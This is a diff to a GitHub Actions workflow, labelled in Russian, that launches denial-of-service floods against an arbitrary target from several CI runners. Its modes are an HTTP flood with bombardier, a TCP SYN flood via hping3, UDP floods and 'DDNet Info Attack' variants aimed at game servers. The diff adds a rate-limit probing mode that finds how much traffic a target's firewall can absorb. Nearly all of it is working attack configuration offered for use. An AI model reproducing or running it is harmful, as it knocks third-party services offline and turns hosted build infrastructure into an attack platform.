@@ -1,10 +1,10 @@
-name: Ultimate Multi-Tool (HTTP/TCP/UDP)
+name: Ultimate Multi-Tool (HTTP/TCP/UDP + Firewall Check)
 
 on:
   workflow_dispatch:
     inputs:
       method:
-        description: 'Выберите метод'
+        description: 'Выберите метод атаки / проверки'
         required: true
         default: 'http'
         type: choice
@@ -16,13 +16,14 @@ on:
           - udp-ddnet-extended
           - udp-ddnet-legacy64
           - udp-ddnet-mixed
+          - firewall-check
 
       target:
-        description: 'IP или URL'
+        description: 'IP или URL цели'
         required: true
 
       port:
-        description: 'Порт'
+        description: 'Порт (для UDP/TCP)'
         required: false
         default: '80'
 
@@ -32,25 +33,42 @@ on:
         default: '500'
 
       duration:
-        description: 'Длительность (300s, 5m, 1h...)'
+        description: 'Длительность теста (300s, 5m, 1h...)'
         required: false
         default: '300s'
 
-      open_loop:
-        description: 'Open-Loop режим'
+      # === Параметры Firewall Check ===
+      fw_max_pps:
+        description: 'FW: Максимальный PPS для теста'
+        required: false
+        default: '5000'
+
+      fw_start_pps:
+        description: 'FW: Начальный PPS'
+        required: false
+        default: '50'
+
+      fw_step_up:
+        description: 'FW: Шаг увеличения PPS'
+        required: false
+        default: '150'
+
+      fw_loss_threshold:
+        description: 'FW: Порог потери для определения лимита (%)'
+        required: false
+        default: '99.9'
+
+      fw_pad_ddnet:
+        description: 'FW: Использовать padding DDNet пакетов'
         required: false
         default: false
         type: boolean
 
-      burst_on:
-        description: 'Burst On (5s, 10s, 0s)'
+      open_loop:
+        description: 'Open-Loop режим (для DDNet атак)'
         required: false
-        default: '0s'
-
-      burst_off:
-        description: 'Burst Off'
-        required: false
-        default: '0s'
+        default: false
+        type: boolean
 
       rate:
         description: 'Rate (пакетов/сек, 0 = unlimited)'
@@ -82,7 +100,7 @@ jobs:
             ~/go/bin
             /usr/local/bin/bombardier
             ./bombarida
-          key: ${{ runner.os }}-tools-v2
+          key: ${{ runner.os }}-tools-v3
 
       - name: Install Dependencies
         run: |
@@ -101,7 +119,7 @@ jobs:
             echo "Bombarida взят из кэша"
           fi
 
-      - name: Download Bombardier (if needed)
+      - name: Download Bombardier
         run: |
           if [ ! -f /usr/local/bin/bombardier ]; then
             echo "Скачиваем bombardier..."
@@ -117,44 +135,58 @@ jobs:
           PORT="${{ github.event.inputs.port }}"
           CONNS="${{ github.event.inputs.connections }}"
           DURATION="${{ github.event.inputs.duration }}"
-          OPEN_LOOP="${{ github.event.inputs.open_loop }}"
-          BURST_ON="${{ github.event.inputs.burst_on }}"
-          BURST_OFF="${{ github.event.inputs.burst_off }}"
           RATE="${{ github.event.inputs.rate }}"
+          OPEN_LOOP="${{ github.event.inputs.open_loop }}"
 
           echo "=== ЗАПУСК $METHOD | $TARGET:$PORT | Машина ${{ matrix.runner }} ==="
-          echo "Duration: $DURATION | Connections: $CONNS | Rate: $RATE | Open-Loop: $OPEN_LOOP"
 
           if [ "$METHOD" == "http" ]; then
+            echo "Запуск HTTP Flood (bombardier)"
             bombardier -c 1000 -d "$DURATION" --http2 -l "$TARGET?cache=$RANDOM"
 
           elif [ "$METHOD" == "tcp" ]; then
+            echo "Запуск TCP SYN Flood (hping3)"
             sudo hping3 --flood -S -p $PORT $TARGET
 
           elif [ "$METHOD" == "udp" ]; then
-            echo "Обычный UDP flood"
+            echo "Запуск обычного UDP Flood"
             ./bombarida -mode client -addr "${TARGET}:${PORT}" \
               -c $CONNS -n 0 -d "$DURATION" -r "$RATE" -t 1s
 
-          else
-            # DDNet режимы
-            echo "DDNet Info Attack"
+          elif [[ "$METHOD" == "udp-ddnet-"* ]]; then
+            echo "Запуск DDNet Info Attack"
             DDNET_FLAGS="-ddnet-info"
-
+            
             case "$METHOD" in
-              "udp-ddnet-vanilla")  DDNET_FLAGS="$DDNET_FLAGS -ddnet-info-kind vanilla" ;;
+              "udp-ddnet-vanilla") DDNET_FLAGS="$DDNET_FLAGS -ddnet-info-kind vanilla" ;;
               "udp-ddnet-extended") DDNET_FLAGS="$DDNET_FLAGS -ddnet-info-kind extended" ;;
               "udp-ddnet-legacy64") DDNET_FLAGS="$DDNET_FLAGS -ddnet-info-kind legacy64" ;;
-              "udp-ddnet-mixed")    DDNET_FLAGS="$DDNET_FLAGS -ddnet-info-kind mixed" ;;
+              "udp-ddnet-mixed") DDNET_FLAGS="$DDNET_FLAGS -ddnet-info-kind mixed" ;;
             esac
 
             if [ "$OPEN_LOOP" == "true" ]; then
               DDNET_FLAGS="$DDNET_FLAGS -open-loop"
-              if [ "$BURST_ON" != "0s" ]; then
-                DDNET_FLAGS="$DDNET_FLAGS -burst-on $BURST_ON -burst-off $BURST_OFF"
-              fi
             fi
 
             ./bombarida -mode client -addr "${TARGET}:${PORT}" \
               -c $CONNS -n 0 -d "$DURATION" -r "$RATE" $DDNET_FLAGS
+
+          elif [ "$METHOD" == "firewall-check" ]; then
+            echo "Запуск Firewall / Rate-Limit Checker"
+            
+            FW_FLAGS="-firewall-check \
+              -fw-max-pps ${{ github.event.inputs.fw_max_pps }} \
+              -fw-start-pps ${{ github.event.inputs.fw_start_pps }} \
+              -fw-step-up ${{ github.event.inputs.fw_step_up }} \
+              -fw-loss-threshold ${{ github.event.inputs.fw_loss_threshold }}"
+
+            if [ "${{ github.event.inputs.fw_pad_ddnet }}" == "true" ]; then
+              FW_FLAGS="$FW_FLAGS -fw-pad-ddnet"
+            fi
+
+            ./bombarida -mode client -addr "${TARGET}:${PORT}" $FW_FLAGS
+
+          else
+            echo "Неизвестный метод: $METHOD"
+            exit 1
           fi
